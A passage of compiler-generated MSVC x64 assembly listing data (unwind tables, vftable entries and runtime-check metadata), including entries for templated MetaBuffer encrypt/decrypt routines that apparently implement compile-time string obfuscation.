??_C@_0BC@EOODALEL@Unknown?5exception@ DB 'Unknown exception', 00H ; `string'
CONST	ENDS
;	COMDAT ??_7exception@std@@6B@
CONST	SEGMENT
??_7exception@std@@6B@ DQ FLAT:??_R4exception@std@@6B@	; std::exception::`vftable'
	DQ	FLAT:??_Eexception@std@@UEAAPEAXI@Z
	DQ	FLAT:?what@exception@std@@UEBAPEBDXZ
CONST	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z DD 025051301H
	DD	010e2313H
	DD	070070029H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Get_size_of_n@$01@std@@YA_K_K@Z DD 025051301H
	DD	010e2313H
	DD	070070025H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$min@_K@std@@YAAEB_KAEB_K0@Z DD 025051801H
	DD	01132318H
	DD	0700c0021H
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z DD 025051801H
	DD	01132318H
	DD	0700c0021H
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z DD 025051801H
	DD	01132318H
	DD	0700c0021H
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$max@_K@std@@YAAEB_KAEB_K0@Z DD 025051801H
	DD	01132318H
	DD	0700c0021H
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	040H
	DW	01f1H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z DD 025054719H
	DD	0118231dH
	DD	07011003dH
	DD	05010H
	DD	imagerel __GSHandlerCheck
	DD	01d8H
xdata	ENDS
;	COMDAT CONST
CONST	SEGMENT
??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z$rtcName$0 DB 05fH ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<1,wchar_t const *>
	DB	050H
	DB	072H
	DB	06fH
	DB	078H
	DB	079H
	DB	00H
	ORG $+1
??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z$rtcName$1 DB 05fH ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<1,wchar_t const *>
	DB	04eH
	DB	065H
	DB	077H
	DB	05fH
	DB	063H
	DB	061H
	DB	070H
	DB	061H
	DB	063H
	DB	069H
	DB	074H
	DB	079H
	DB	00H
	ORG $+2
??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z$rtcName$2 DB 05fH ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<1,wchar_t const *>
	DB	04eH
	DB	065H
	DB	077H
	DB	05fH
	DB	070H
	DB	074H
	DB	072H
	DB	00H
	ORG $+15
??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z$rtcVarDesc DD 0c8H ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<1,wchar_t const *>
	DD	08H
	DQ	FLAT:??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z$rtcName$2
	DD	0a8H
	DD	08H
	DQ	FLAT:??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z$rtcName$1
	DD	084H
	DD	01H
	DQ	FLAT:??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z$rtcName$0
	ORG $+144
??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z$rtcFrameData DD 03H ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<1,wchar_t const *>
	DD	00H
	DQ	FLAT:??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z$rtcVarDesc
CONST	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Convert_size@_K_K@std@@YA_K_K@Z DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01f9H
	DW	0223H
	DW	024dH
	DW	0277H
	DW	02a1H
	DW	02cbH
	DW	02f5H
	DW	031fH
	DW	0349H
	DW	0373H
	DW	039dH
	DW	03c7H
	DW	03f1H
	DW	041bH
	DW	0445H
	DW	046fH
	DW	0499H
	DW	04c3H
	DW	04edH
	DW	0517H
	DW	0541H
	DW	056bH
	DW	0595H
	DW	05bfH
	DW	05e9H
	DW	0613H
	DW	063dH
	DW	0667H
	DW	0691H
	DW	06bbH
	DW	06e5H
	DW	070fH
	DW	0739H
	DW	0763H
	DW	078dH
	DW	07b7H
	DW	07e1H
	DW	080bH
	DW	0835H
	DW	085fH
	DW	0889H
	DW	08b3H
	DW	08ddH
	DW	0907H
	DW	0931H
	DW	095bH
	DW	0985H
	DW	09afH
	DW	09d9H
	DW	0a03H
	DW	0a2dH
	DW	0a57H
	DW	0a61H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0BH@$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01f9H
	DW	0223H
	DW	024dH
	DW	0277H
	DW	02a1H
	DW	02cbH
	DW	02f5H
	DW	031fH
	DW	0349H
	DW	0373H
	DW	039dH
	DW	03c7H
	DW	03f1H
	DW	041bH
	DW	0445H
	DW	046fH
	DW	0499H
	DW	04c3H
	DW	04edH
	DW	0517H
	DW	0541H
	DW	056bH
	DW	0595H
	DW	05bfH
	DW	05e9H
	DW	0613H
	DW	063dH
	DW	0667H
	DW	0691H
	DW	06bbH
	DW	06e5H
	DW	070fH
	DW	0739H
	DW	0763H
	DW	078dH
	DW	07b7H
	DW	07e1H
	DW	080bH
	DW	0835H
	DW	085fH
	DW	0889H
	DW	08b3H
	DW	08bdH
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0DF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01f9H
	DW	0223H
	DW	024dH
	DW	0277H
	DW	02a1H
	DW	02cbH
	DW	02f5H
	DW	031fH
	DW	0349H
	DW	0373H
	DW	039dH
	DW	03c7H
	DW	03f1H
	DW	041bH
	DW	0445H
	DW	046fH
	DW	0499H
	DW	04c3H
	DW	04edH
	DW	0517H
	DW	0541H
	DW	056bH
	DW	0595H
	DW	05bfH
	DW	05e9H
	DW	0613H
	DW	063dH
	DW	0667H
	DW	0671H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$04$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01f9H
	DW	0223H
	DW	024dH
	DW	0277H
	DW	02a1H
	DW	02cbH
	DW	02f5H
	DW	031fH
	DW	0349H
	DW	0373H
	DW	039dH
	DW	03c7H
	DW	03f1H
	DW	041bH
	DW	0445H
	DW	046fH
	DW	0499H
	DW	04c3H
	DW	04edH
	DW	0517H
	DW	0541H
	DW	056bH
	DW	0595H
	DW	05bfH
	DW	05e9H
	DW	0613H
	DW	063dH
	DW	0667H
	DW	0691H
	DW	06bbH
	DW	06e5H
	DW	070fH
	DW	0739H
	DW	0763H
	DW	078dH
	DW	07b7H
	DW	07e1H
	DW	080bH
	DW	0835H
	DW	085fH
	DW	0889H
	DW	08b3H
	DW	08ddH
	DW	0907H
	DW	0931H
	DW	095bH
	DW	0985H
	DW	09afH
	DW	09d9H
	DW	0a03H
	DW	0a2dH
	DW	0a57H
	DW	0a81H
	DW	0aabH
	DW	0ad5H
	DW	0affH
	DW	0b09H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0HB@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?encrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z DD 025051701H
	DD	01122317H
	DD	0700b001dH
	DD	0500aH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	05fH
	DB	080H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?decrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@QEAAPEBDXZ DD 025051301H
	DD	010e2313H
	DD	070070021H
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	026H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?isDecrypted@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@QEBA_NXZ DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	02bH
	DW	055H
	DW	07fH
	DW	0a9H
	DW	0d3H
	DW	0fdH
	DW	0127H
	DW	0151H
	DW	017bH
	DW	01a5H
	DW	01cfH
	DW	01f9H
	DW	0223H
	DW	024dH
	DW	0277H
	DW	02a1H
	DW	02cbH
	DW	02f5H
	DW	031fH
	DW	0349H
	DW	0373H
	DW	039dH
	DW	03c7H
	DW	03f1H
	DW	041bH
	DW	0445H
	DW	046fH
	DW	0499H
	DW	04c3H
	DW	04edH
	DW	0517H
	DW	0541H
	DW	056bH
	DW	0595H
	DW	05bfH
	DW	05e9H
	DW	0613H
	DW	063dH
	DW	0667H
	DW	0691H
	DW	06bbH
	DW	06e5H
	DW	070fH
	DW	0719H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@QEAA@PEBE@Z DD 025051801H
	DD	01132318H
	DD	0700c001fH
	DD	0500bH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	036H
	DW	0441H
voltbl	ENDS
;	COMDAT xdata
